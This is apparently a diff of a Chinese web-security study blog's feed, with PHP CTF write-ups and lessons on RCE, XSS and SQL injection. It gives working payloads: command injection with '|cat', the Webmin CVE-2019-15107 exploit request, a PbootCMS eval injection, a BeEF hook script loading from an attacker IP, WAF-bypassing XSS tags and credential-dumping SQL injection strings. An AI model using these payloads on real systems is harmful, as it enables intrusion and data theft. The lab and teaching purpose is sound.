+这个页面没有提供登录框、输入框等明显的交互方式，说明认证逻辑藏在代码或请求里，需要去挖掘。
+需要找到绕过身份验证的方法，比如：
+查看页面源码或备份文件
+分析隐藏的参数或 Cookie
+利用编码、弱类型等漏洞
+
+
+
+
+由于题目的标题是PHP，所以我们试一下 index.php 或者 index.phps。
+
+
+
+读代码
+
+&lt;?phpif(&quot;admin&quot;===$_GET[id]) &#123;    echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);    exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;admin&quot;)&#123;    echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;    echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;&#125;?&gt;
+
+
+=== 强比较：禁止直接传入 id=admin。
+代码对 id 进行了第二次 URL 解码，我们可以利用这一点。
+绕过思路：对 &quot;admin&quot; 进行两次 URL 编码，让浏览器第一次解码后不等于 &quot;admin&quot;，通过第一层判断；代码第二次解码后得到 &quot;admin&quot;，触发第二层判断。
+
+
+用bp，对 admin 进行两次 URL 编码
+
+
+得到：
+%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
+
+
+构造 payload：
+
+?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
+
+
+成功绕过认证，获取 Flag
+
+
+
+四、[Bugku CTF] 各种绕过哟1. 题目
+2. 解题思路
+代码审计
+
+&lt;?phphighlight_file(&#x27;flag.php&#x27;);$id = urldecode($_GET[&#x27;id&#x27;]);$flag = &#x27;flag(xxxxxxxxxxxxxxx)&#x27;;if (isset($_GET[&#x27;uname&#x27;]) and isset($_POST[&#x27;passwd&#x27;])) &#123;    if ($_GET[&#x27;uname&#x27;] ==$_POST[&#x27;passwd&#x27;]) &#123;        print &#x27;passwd can not be uname.&#x27;;    &#125;    else if (sha1($_GET[&#x27;uname&#x27;]) === sha1($_POST[&#x27;passwd&#x27;]) &amp;&amp; ($id==&#x27;margin&#x27;)) &#123;        die(&#x27;Flag:&#x27;.$flag);    &#125;    else &#123;        print &#x27;sorry!&#x27;;    &#125;&#125;?&gt;
+
+
+GET传 uname 和 id；
+POST传 passwd；
+需满足的条件：
+$_GET[&#39;uname&#39;] !=$_POST[&#39;passwd&#39;]
+sha1($_GET[&#39;uname&#39;]) === sha1($_POST[&#39;passwd&#39;])（SHA1强相等）；
+$id = urldecode($_GET[&#39;id&#39;]); 并且 $id==&#39;margin&#39;
+
+
+
+
+分析条件
+
+
+PHP的 sha1() 函数只接受字符串&#x2F;数字，传入数组会返回 NULL；要求SHA1值必须强相等，那么传入两个不同的数组（比如 uname[]=1 和 passwd[]=2）满足 uname != passwd。
+id 直接传 margin，源码没有 if($id == &#39;margin&#39;) 这类校验逻辑，不存在匹配拦截，所以不需要二次 URL 编码绕过。
+
+3. 解题步骤
+代码审计，读懂代码，找到漏洞
+要满足拿到flag的三个条件
+给 GET 的 uname 传数组：uname[]=1 → sha1(uname) = NULL；
+
+给 POST 的 passwd 传数组：passwd[]=2 → sha1(passwd) = NULL；
+id 直接传 margin
+
+开发者工具→hackbar
+
+
+
+
+或者用bp
+
+
+请求方式改为 POST
+POST /?id=margin&amp;uname[]=1 HTTP/1.1
+
+
+
+五、[Bugku CTF] 矛盾1. 题目
+2. 解题思路
+代码分析
+
+$num = $_GET[&#x27;num&#x27;];if(!is_numeric($num))&#123;    echo $num;    if($num==1)    echo &#x27;flag&#123;*********&#125;&#x27;;&#125;
+
+
+is_numeric() 的官方定义是：专门用来检测变量是否为数字或纯数字字符串
+条件1：!is_numeric($num) 要求 num 的值不能是数字或数字字符串
+条件2：$num==1 要求 num 在弱比较中等于 1。
+
+
+绕过：传值 1+除数字之外的
+
+我们需要传一个不是数字类型，但弱比较等于1的值。
+
+
+
+
+六、[MRCTF2020] Ez_bypass1. 题目
+2. 解题思路
+查看源码
+
+
+
+代码分析
+
+md5($id) === md5($gg) &amp;&amp; $id !== $gg
+
+要让 $id 和 $gg 的 MD5 哈希值完全一样，但 $id 和 $gg 本身的内容必须不同。
+数组绕过：给 $id 和 $gg 传不同的数组
+
+!is_numeric($passwd) &amp;&amp; $passwd == 1234567
+
+传入的 passwd 不能是「纯数字」（is_numeric 返回 false），但用弱类型比较时，它又要等于数字 1234567。
+
+
+构造payload
+
+GET 部分
+?gg[]=1&amp;id[]=2
+
+POST 部分
+passwd=1234567a
+
+
+
+得到flag
+
+
+
+七、[CTFShow] web111. 题目
+2. 解题思路
+分析代码
+
+
+
+弱类型比较：最终使用 == 弱类型比较密码与 $_SESSION[&#39;password&#39;]
+绕过思路：$_SESSION[&#39;password&#39;] 和 $password 为空。简单说就是，删除 PHPSESSID 强制服务器生成未初始化的空 Session（其值为 NULL），并传入空字符串密码（&quot;&quot;），利用 PHP 底层 &quot;&quot; == NULL 恒为真的弱比较漏洞，成功绕过了登录验证。
+
+
+bp抓包修改。
+
+
+
+
+得到flag
+
+
+]]></content>
+      <categories>
+        <category>CTF-WP</category>
+        <category>Lab-WP</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RCE漏洞</title>
+    <url>/2026/06/08/RCE%E6%BC%8F%E6%B4%9E/index/</url>
+    <content><![CDATA[一、RCE简介与危害
+RCE：Remote Code&#x2F;Command Execution，分为远程代码执行、远程命令执行。
+成因：开发使用可执行代码&#x2F;系统命令的函数，函数入参用户可控且无过滤，触发漏洞。
+危害：攻击者直接在服务器执行系统指令，完全接管服务器权限。
+案例：
+
+
+远程代码执行（eval函数示例）
+
+&lt;?php$code=$_GET[&#x27;x&#x27;];eval($code);?&gt;
+
+测试payload：
+
+http://localhost/1.php?x=phpinfo();
+http://localhost/1.php?x=echo%20abc;
+
+
+
+
+
+
+远程命令执行（system函数示例）
+
+&lt;?php$code=$_GET[&#x27;x&#x27;];echo system($code);?&gt;
+
+测试payload
+
+http://localhost/2.php?x=ipconfig
+
+
+
+
+http://localhost/2.php?x=whoami
+
+
+二、墨者学院靶场https://mozhe.cn/
+案例1：Ping命令注入（靶场：https://mozhe.cn/bug/detail/12）
+
+
+
+页面输入127.0.0.1正常ping
+
+
+
+
+确认系统
+
+
+
+
+前端JS限制IP格式，前端过滤可绕过。
+
+
+
+
+Burp抓包修改POST参数：iipp=127.0.0.1|ls&amp;submit=Ping，|为命令拼接符，前命令执行完执行后续ls。
+
+
+
+
+查看返回目录：index.php、key_xxxx.php。
+
+
+
+
+最终payload：iipp=127.0.0.1|cat&lt;key_32507850714807.php&amp;submit=Ping，读取key值。
+
+
+
+
+注：命令分隔符有|、||、&amp;、&amp;&amp;、;
+
+案例2 PHP反引号命令执行（靶场：https://mozhe.cn/bug/detail/13）
+
+
+
+
+
+解析代码，使⽤php
+
+注意： PHP 要求字符串字面量必须用单引号（&#39;）或双引号（&quot;）括起来  
+&lt;?php   print(gzinflate(base64_decode(&quot;&amp;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;&quot;))); ?&gt;  
+
+新建一个 2.php 文件，把这段代码粘贴进去。再把文件放到 phpstudy 的网站根目录，访问。
+
+
+PHP中内容反引号内内容会被当作系统shell命令执行。
+&lt;?phpecho `$_REQUEST[a]`;?&gt;
+
+
+payload1：?a=ls 列出当前目录，发现key文件。
+
+
+
+
+payload2：?a=cat&lt;key_5358811711226.php 读取key内容。
+
+
+
+案例3 CVE-2019-15107 Webmin RCE漏洞(1) Webmin 介绍Webmin是用于管理类Unix系统的管理配置工具，拥有Web页面。该漏洞出现在password_change.cgi的密码重置功能处，因为缺少输入验证，恶意第三方可以传入恶意参数执行恶意代码。
+https://mozhe.cn/bug/detail/309
+(2) 部署sudo sucd /home/enjoy/vulhub-master/webmin/CVE-2019-15107/docker-compose builddocker-compose up -ddocker-compose down
+
+漏洞点：password_change.cgi密码重置页面参数可控，old参数可拼接系统命令。
+(3) 操作
+
+
+
+
+
+
+
+
+
+
+登录拦截
+
+
+
+
+漏洞测试：利用数据包
+
+POST /password_change.cgi HTTP/1.1Host: 182.44.114.36:46542Cookie: redirect=1;testing=1; sid=x; sessiontest=1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflate, brDnt: 1Referer: https://182.44.114.36:46542/session_login.cgiContent-Type: application/x-www-form-urlencodedContent-Length: 62Connection: keep-aliveuser=rootxx&amp;pam=&amp;expired=2&amp;old=test|id&amp;new1=test2&amp;new2=test2
+
+Host: 靶机IP:端口	改成自己的
+常用 Payload
+
+old=test|id 执行id查看当前用户
+old=test|ls / 列出根目录文件
+old=test|cat /key.txt 读取根目录key
+
+
+
+
+获取 cookie
+
+
+
+
+
+
+
+案例4 PbootCMS代码执行漏洞
+
+(1) 漏洞分析漏洞成因：页面{pboot:if(eval($_POST[1]))}标签解析，POST参数1可控。
+审计⼯具查询危险函数：
+
+
+
+
+
+
+
+
+eval(&#x27;if(&#x27; . $matches[1][$i] . &#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;);
+
+(2) 操作
+在线留言
+
+
+
+AboutController ： &#123;pboot:if(eval($_POST[1]))&#125;!!!&#123;/pboot:if&#125;  
+
+
+
+
+
+
+
+
+登录后台：admin.php
+
+
+
+账号：admin 密码：1234556
+
+
+
+
+
+访问首页：http://localhost/pcms/index.php/about/10.html
+POST传参：1=phpinfo();，触发eval执行代码。
+
+
+
+
+三、RCE漏洞防御方案
+危险函数入参做严格黑名单&#x2F;白名单过滤，过滤| &amp; ; $ &gt; &lt;等命令拼接符号。
+尽量避免使用eval、system、exec、shell_exec、``反引号等高危执行函数。
+若业务必须使用命令执行函数，采用escapeshellarg&#x2F;escapeshellcmd对输入转义过滤。
+
+
+四、总结Q1：命令执行漏洞是什么？分别叫什么？remote command execution 远程命令执行
+remote code execution 远程代码执行
+Q2：命令执行漏洞的危害是什么？执行系统命令
+权限：一般情况下。RCE 漏洞的权限是 web 服务进程运行的权限（如 apache 进程权限 www-data）
+查看权限的命令
+Linux 查看权限：id
+Windows 查看权限：whoami &#x2F;all 或 whoami &#x2F;priv
+Q3：如何挖掘 RCE 漏洞？黑盒测试：除了 CTF、靶场以外，现实中无法通过黑盒挖掘命令执行漏洞，大部分都是靠扫描器（X-RAY），对于 RCE 漏洞都是只扫描历史漏洞
+Q4：如果给源代码，如何进行代审？通过找命令执行函数
+例如：
+
+system：执行系统命令，自带输出结果。
+shell_exec：执行系统命令，不会自动输出结果，需要编写 echo 语句输出。
+例如： echo shell_exec($cmd);
+
+
+exec：执行系统命令，不会自动输出结果，需要编写 echo 语句输出，但只能输出最后一行。
+例如： echo exec($cmd);
+
+
+passthru：执行系统命令，自带输出结果。
+popen：执行系统命令，不会自动输出结果，需要把结果导出到文本文件中，在读取文本文件中保存好的命令执行结果。
+&#96;(反引号）：执行系统命令，不会自动输出结果，需要编写 echo 语句输出，和shell_exec 一致。
+
+Q5：RCE漏洞中，命令拼接符有哪些？&amp;&amp;		||	|	;（Windows 不支持）	&amp;
+Q6：如何反弹 shell？
+nc 反弹 shell
+bash 反弹 shell
+（Windows）powershell 反弹shell	Online - Reverse Shell Generator
+
+Q7：如何修复 RCE 漏洞？
+后端限制用户输入的内容格式，如输入 ip（验证用户输入的是不是 ip）
+php 自带函数（禁用）PHP: escapeshellarg - Manual
+在给源代码的情况下，找 PHP 配置中的 disable_functions&#x3D;shell_exec、system、exec、passthru、popen
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>RCE</category>
+      </categories>
+      <tags>
+        <tag>RCE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XSS漏洞</title>
+    <url>/2026/06/08/XSS%E6%BC%8F%E6%B4%9E/index/</url>
+    <content><![CDATA[一、XSS简介与危害（1）定义跨站脚本攻击XSS（Cross Site Scripting），为避免与层叠样式表（CSS）缩写混淆，故缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
+（2）危害
+盗取各类用户账号，如机器登录帐号、用户网银帐号、各类管理员帐号
+控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
+盗窃企业重要的具有商业价值的资料
+非法转账
+强制发送电子邮件
+网站挂马
+控制受害者机器向其它网站发起攻击（重定向语句）
+窃取cookie的sessionid，冒充登录
+
+
+二、反射型与存储型XSSXSS攻击可分为三类：反射型、存储型、DOM型，易混淆的是反射和DOM类型。
+1. 反射型（1）反射型流程
+黑客诱导用户点击恶意URL：xxxxxxx.com/?xxx=&lt;script&gt;恶意代码&lt;/script&gt;
+客户端向URL对应的服务器发出请求
+服务器将恶意代码从URL中取出，拼接在HTML中返回给浏览器
+客户端解析代码，恶意代码随之执行
+
+
+
+（2）案例
+编写代码
+
+把 php 文件放在 phpstudy 的 www 目录下
+&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;
+
+访问
+?x=1?x=&lt;script&gt;alert(1)&lt;/script&gt;?x=&lt;script&gt;alert(&#x27;已入侵你后端系统&#x27;)&lt;/script&gt;?x=&lt;h1 style=&#x27;font-size: 10vw;&#x27;&gt;你已被入侵啦,遭到破坏！&lt;/script&gt;&lt;/h1&gt;
+
+
+fofa搜索命令
+
+&quot;pikachu&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; title=&quot;Get the pikachu&quot;
+
+
+
+
+
+进入 pikachu 靶场
+如果 fofa 访问失败，可以自己搭建pikachu靶场**。**
+pikachu靶场：反射型XSS 练习
+
+反射型xss
+
+
+
+先输入 1 测试
+
+
+输入恶意代码
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+方法一：
+直接在 URL 中修改 message 的值。因为根据测试结果来看，我们输入的 1 实际上是 message 的值。
+
+
+
+
+方法二：
+直接在输入框里输入恶意代码，但是我们发现会有长度限制：
+
+
+F12，发现可以输入的最大长度是 20，那我们就可以把它的数值改大一点。
+
+
+
+
+注意：改完之后不要刷新，不然又会恢复 20。
+
+
+总结：输入框长度限制可通过修改URL或F12改前端代码绕过
+2. 存储型攻击数据存储在服务器，攻击持续生效，危害比反射型更大。
+以 pikachu 靶场为例：
+
+
+传入一个恶意代码
+&lt;h1 style=&#x27;font-size: 10vw;&#x27;&gt;你已被入侵啦,遭到破坏！&lt;/script&gt;&lt;/h1&gt;
+
+
+
+只要刷新这个页面，就会重复出现这句话。
+3. DOM型（1）流程
+黑客诱导用户点击恶意URL
+
+#&#x27; onclick=&quot;alert(1)&quot;
+
+
+客户端直接执行攻击代码，无需与服务器交互
+攻击纯粹发生在客户端
+
+
+
+以 pikachu 靶场为例：
+
+
+先输入 1 测试一下
+
+
+传入一个恶意代码：
+#&#x27; onclick=&quot;alert(1)&quot;
+
+
+
+点击之后：
+
+
+4. BeEF-XSS工具使用具体使用：beef-xss详细教程-CSDN博客
+BeEF是Kali自带的XSS利用工具，基于Ruby开发。
+
+
+（1）核心信息
+Web UI：http://127.0.0.1:3000/ui/panel
+Hook代码：&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;
+
+（2）攻击流程
+黑客（Kali）IP 放入 Hook 代码中
+
+&lt;script src=&quot;http://192.168.23.131:3000/hook.js&quot;&gt;&lt;/script&gt;
+
+
+注入Hook代码到表单提交入库
+
+
+
+
+
+
+受害者访问页面被Hook，BeEF控制台可控制浏览器（如重定向）
+
+
+三、XSS的绕过技巧与修复1. 未开启WAF直接URL注入：
+http://localhost/1.php?x=%3Cscript%3Ealert(1)%3C/script%3E
+
+2. 开启WAF（安全狗）请求被拦截，提示“带有不合法参数”。
+3. 手工绕过（1）标签语法替换
+audio标签
+
+&lt;audio src=x onerror=alert(47)&gt;&lt;audio src=x onerror=prompt(1);&gt;&lt;audio src=1 href=1 onerror=javascript:alert(1)&gt;
+
+
+video标签
+
+&lt;video src=x onerror=prompt(1);&gt;&lt;video src=x onerror=alert(48)&gt;
+
+
+button标签
+
+&lt;button onfocus=alert(1) autofocus&gt;&lt;button/onclick=alert(1)&gt;xss&lt;/button&gt;
+
+（2）加密算法&lt;details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;# 97,108,101,114,116,40,49,41 = alert(1)
+
+4. XSStrike工具可识别并绕过WAF的XSS扫描工具，项目地址：https://github.com/s0md3v/XSStrike
+（1）常用参数XSStrike
+-h, --help显示帮助信息
+-u, --url指定目标 URL
+--dataPOST 方式提交内容
+-v, --verbose详细输出
+-f, --file加载自定义 payload 字典
+-t, --threads定义线程数
+-l, --level爬行深度
+-t, --encode定义 payload 编码方式
+--json将 POST 数据视为 JSON
+--path测试 URL 路径组件
+--seeds从文件中测试、抓取 URL
+--fuzzer测试过滤器和 Web 应用程序防火墙（WAF）
+--update更新工具
+--timeout设置超时时间
+--params指定参数
+--crawl爬行目标网站
+--proxy使用代理
+--blind盲测试
+--skip跳过确认提示
+--skip-dom跳过 DOM 扫描
+--headers提供 HTTP 标头
+-d, --delay设置请求延迟
+
+（2）使用示例# 安装依赖pip install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/# Fuzz测试python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot; --fuzzer# 直接探测python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot;
+
+（3）优化测试页面&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;title&gt;欢迎来到&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎&lt;/h1&gt;&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;&lt;center&gt;测试XSS&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
+
+
+四、总结Q1：XSS 是什么？跨站脚本攻击
+Q2：XSS的产生原因是什么？后端开发没有对用户传入的参数做严格的限制或过滤，直接输出了用户传入的参数，导致用户传入的参数被浏览器当作 javascript 执行。
+Q3：XSS有什么危害？1、获取浏览器的其他信息
+2、窃取浏览器的敏感信息
+3、劫持浏览器（用  BeEF ，了解常用功能，比如：重定向redirect、）
+Q4：怎么修复 XSS漏洞？过滤常见关键字
+Q5：怎么绕 WAF？挨个使用 audio、script、video、button标签、加密算法，最后使用产生随机码。
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>XSS</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PHP基础安全</title>
     <url>/2026/06/22/PHP%E5%9F%BA%E7%A1%80%E5%AE%89%E5%85%A8/index/</url>
     <content><![CDATA[一、什么是PHP?1. 定义PHP(全称:PHP: Hypertext Preprocessor,超文本预处理器)是一门开源的服务器端脚本编程语言, 专门用于开发Web网站的后端逻辑。
@@ -1012,793 +2667,6 @@ Web安全核心原则：不信任任何外部传入参数
       </tags>
   </entry>
   <entry>
-    <title>SQL注入漏洞</title>
-    <url>/2026/05/23/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index/</url>
-    <content><![CDATA[1. 什么是 SQL 注入SQL注入是一种常见的网络安全漏洞和攻击方式，它利用应用程序对用户输入数据的处理不当，使得攻击者能够在执行SQL查询时插入恶意的SQL代码。通过成功注入恶意代码，攻击者可以执行未经授权的数据库操作，获取敏感信息、篡改数据甚至完全破坏数据库。
-SQL 注入就是：有人在网站的输入框（比如登录框、搜索框）里，不是输正常内容，而是偷偷塞一段 SQL 数据库命令，想骗数据库执行，达到偷数据、删数据甚至改网站的目的。
-
-2. SQL 注入分类常见的注入点：
-?str=xxx?test=xxx?idstr=xxx?id=xxx
-
-2.1 union 注入2.1.1 概念：union查询注入是最基础的注入。在SQL中， UNION 操作符用于合并两个或多个 SELECT 语句的结果。union 查询注入利用 UNION 关键字可以追加一条或者多条额外的 SELECT 查询，并将结果追加到原始查询中。联合查询会“纵向”拼接两个或多个 SELECT 语句的结果.
-2.1.2 适用条件：（1）网页存在注入点，有回显。
-（2）需要满足union语句要求，即：
-union前后两个select的结果集应具有相同列数；
-union前后两个select的结果集对应列应是相同数据类型
-2.1.3 注入步骤：
-首先判断是否存在注入点及注入的类型。
-
-https://地址/?id=1通过修改id的值判断是否存在注入点
-
-
-使用ORDER BY 查询列数
-
-https://地址/?id=1 order by 1修改 order by 后面的数据不报错代表存在，报错即为最大列数
-
-
-判断回显的位置
-
-?id=-1 union select 1,2,3注意：这里的id不可以填1，因为1是真实存在的，而我们不想查到真实存在的数据，所以要改成一个不存在的数：-1
-
-
-获取数据库名
-
-以三个字段数为例：
-?id=-1 union select 1,2,database()		//查询当前数据库?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata		// 查询所有数据库名
-
-
-获取数据库中的所有表名
-
-?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where tables_schema=&#x27;数据库名&#x27;
-
-
-获取数据库的表中的所有字段名
-
-?id=-1 union select 1,2,group_concat(colunm_name) from information_schema.colunms where tables_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;
-
-
-获取字段中的数据。
-
-?id=-1 union select 1,2,目标字段 from 目标表名 limit 0,1// 如果想要数据一一对应，使用concat将多个字段内容合并为输出// 例如：?id=-1 union select 1,2,concat(username, &#x27;:&#x27;, password) from users limit 0,1
-
-2.1.4 总结
-union 注入要求存在注入点，有回显
-需要满足 union 语句要求
-
-2.2 报错注入2.2.1 概念报错注⼊是利⽤⽹站的报错信息来带出我们想要的信息，就是在错误信息中执⾏sql语句
-2.2.2 使用条件考虑到成功率和时间成本⽐union成本⾼，需要数据库有错误信息，⼀般在union条件不能实施的时候，在查询，新增，修改能都使⽤
-2.2.3 报错注入命令该部分参考：https://cloud.tencent.com/developer/article/2159753
-groupby重复键冲突利⽤count()、rand()、floor()、groupby这⼏个特定的函数结合在⼀起产⽣的注⼊漏洞
-?id=1 and (select 1 from (select count(*),concat(0x5e,(目标查询语句),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)
-
-核心是利用 count(*) + rand() + group by 触发主键重复错误，把 concat 包裹的目标数据（如版本号、表名）带出，无需页面回显也能拿到数据（当 union 被禁用时）。
-1、 命令解释
-1. `count(*)`
-
-统计有多少行数据，用来触发分组。
-2. `rand(0)`
-
-生成固定的随机数（不是真随机， predictable）
-3. `floor(rand(0)*2)`
-
-结果只有两个：0 或者 1
-4. `group by x`
-
-按 x 分组，MySQL 会建一张临时表存分组结果。
-5. `concat(0x5e, 数据, 0x5e)`
-
-把 版本号 &#x2F; 库名 &#x2F; 表名 拼进字符串里。
-- `0x5e` = **^** 符号，只是分隔符
-
-2、 问题：
-为什么会报错？
-MySQL 做 group by 时：
-
-先算 floor(rand(0)*2) → 得到 0 或 1
-把结果插入临时表
-插入时又算了一次 rand (0)
-两次结果不一样 → 出现重复键
-直接报错：Duplicate entry（重复条目）
-关键：**报错的时候，会把我们拼接的【数据】一起输出来！**数据就这样拿到了。
-
-为什么 rand (14) 更好？
-rand (14) 只需要 2 条数据就能触发冲突rand (0) 需要 3 条数据 才会报错。
-3、 总结
-
-用 rand() 生成 0&#x2F;1
-用 group by 建临时表
-插入时重复计算 rand ()
-产生重复键报错
-错误信息里带出我们要的数据
-
-3、 如何使用
-不懂原理知道如何使用即可，想查什么，就把 version() 换成：
-
-database() → 查库名
-table_name → 查表名
-column_name → 查字段
-password → 查数据
-
-示例：
-?id=1 and (select 1 from (select count(*),concat(0x5e,(select version() from information_schema.tables limit 0,1),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)
-
-把想要的数据（这里是 version()）爆在报错信息里。
-xpath报错MySQL 有两个 XML 函数：extractvalue ()、updatexml ()
-只要给它不符合 XPath 语法的字符串，它就会报错，并把错误内容直接显示出来。
-extractvalue()?id=1 and extractvalue(1, concat(0x5c, (查询语句), 0x5c))
-
-
-作用：从 XML 里查数据。
-语法：
-
-extractvalue( XML文档, XPath路径 )
-
-updatexml()?id=1 and updatexml(1, concat(0x5e, (查询语句), 0x5e), 1)
-
-
-作用：修改 XML 里的数据。
-语法：
-
-updatexml( XML文档, XPath路径, 新值 )
-
-
-注意：
-
-updatexml() 仅能获取返回32位字符，对于长字符串需要分批次获取：
-&#x27; or updatexml(1,concat(0x5e,(select concat(name,&#x27;:&#x27;,substring(password,1,16)) from users limit 0,1),0x5e),1) or &#x27;&#x27; or updatexml(1,concat(0x5e,(select concat(name,&#x27;:&#x27;,substring(password,17)) from users limit 0,1),0x5e),1) or &#x27;
-
-0x5e、0x5c 是什么？
-0x5e → ^
-0x5c → ____
-
-作用：破坏 XPath 语法，强制报错。
-攻击语句INSERT INTO messages(字段1, 字段2, 字段3) VALUES (&#x27;&#x27;, &#x27;&#x27;, &#x27; 攻击语句 &#x27;);// 例如：$sql = &quot;INSERT INTO messages(`uname`,`title`,`content`) VALUES (&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27; or extractvalue(1, concat(0x5c, database(), 0x5c)) or &#x27;&#x27;)&quot;;
-
-
-获得数据库名字
-
-&#x27; or extractvalue(1, concat(0x5c, (select database() from information_schema.tables limit 0,1), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select database() from information_schema.tables limit 0,1), 0x5e), 1) or &#x27;
-
-
-获得表名
-
-&#x27; or extractvalue(1, concat(0x5c, (select group_concat(table_name) from information_schema.tables where table_schema=库名), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select group_concat(table_name) from information_schema.tables where table_schema=库名), 0x5e), 1) or &#x27;
-
-
-获得表的字段
-
-&#x27; or extractvalue(1, concat(0x5c, (select group_concat(column_name) from information_schema.columns where table_schema=库名 and table_name=表名), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select group_concat(column_name) from information_schema.columns where table_schema=库名 and table_name=表名), 0x5e), 1) or &#x27;
-
-
-获得数据
-
-&#x27; or extractvalue(1, concat(0x5c, (select concat(字段1,&#x27;:&#x27;,字段1) from 表名 limit 0,1), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select concat(字段2,&#x27;:&#x27;,密码2) from 表名 limit 0,1), 0x5e), 1) or &#x27;
-
-2.3 布尔盲注2.3.1 概念当改变浏览器传给后台SQL的参数后，浏览器没有显⽰对应内容也没有显⽰报错信息时，⽆法使⽤ union联合查询注⼊与报错注⼊，这时候可以试试看能否使⽤布尔注⼊
-2.3.2 使用条件⼀般情况下，当带⼊参数为真和假时，⻚⾯会有不同的反映，⽐如有⽆显⽰也是⼀种不同，布尔盲注就是根据这种不同来反推我们输⼊的条件是真还是假。
-2.3.3 注入步骤示例参数：库名 data、表名 users、字段 name、password
-
-判断是否存在布尔注入使用布尔条件，绕过真假不同条件的时候，页面有变化，可以考虑使用布尔注入。
-
-?id=2 and 1=1?id=2 and 1=2
-
-
-猜解数据库名
-
-a. 判断库名长度
-?id=1 and length(database())&lt;数值?id=1 and length(database())&gt;数值?id=1 and length(database())=数字
-
-示例（假设数据库名为 data）：
-?id=1 and length(database())&lt;5?id=1 and length(database())&gt;2?id=1 and length(database())=4		// true 说明数据库名的长度为4
-
-b. 逐字符猜库名可以使用ASCII码，甄别出数据库每一个字符
-
-
-数据库的名字⼀般都是a-z,A-Z组成，也可能出现数字、下划线等字符
-?id=1 and ascii(substr(database(),第几位,1))&lt;ASCII值?id=1 and ascii(substr(database(),第几位,1))&gt;ASCII值?id=1 and ascii(substr(database(),第几位,1))=ASCII值/*substr(database(), 第几位, 1)：表示从database()返回的字符串中，“第几位”，就是截取第几个字符。比如 data 中，d就是第一位*/?id=1 and ascii(substr(database(),1,1))&lt;123	// 122为z?id=1 and ascii(substr(database(),1,1))&gt;64	// 65为A
-
-示例（库名：data）：
-?id=1 and ascii(substr(database(),1,1))&lt;123	//true?id=1 and ascii(substr(database(),1,1))&gt;64	//true?id=1 and ascii(substr(database(),1,1))&gt;100	//true?id=1 and ascii(substr(database(),1,1))&gt;110	//false?id=1 and ascii(substr(database(),1,1))=100	//true 100对应d?id=1 and ascii(substr(database(),2,1))=97	//true 97对应a?id=1 and ascii(substr(database(),3,1))=116 //true 116对应t?id=1 and ascii(substr(database(),4,1))=97	//true 97对应a// 合起来库名就是data
-
-c. 验证库名
-?id=1 and database()=&#x27;库名&#x27;
-
-示例（库名：data）：
-?id=1 and database()=&#x27;data&#x27;
-
-
-猜解库内数据表
-
-a. 判断表数量
-?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())&lt;数值?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())&lt;数值?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())=数量	//知道有几个表
-
-b. 判断表名长度
-// 判断单张表?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;数值?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;数值?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 数字// 判断多张表：?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1))=长度// 偏移量：= 第几个表 / 第几个字段，从 0 开始数！//比如：-- 第1张表?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 0,1))=长度-- 第2张表?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 1,1))=长度
-
-示例（表名：users）：
-?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1))&lt;10?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1))&lt;5?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1)) = 5
-
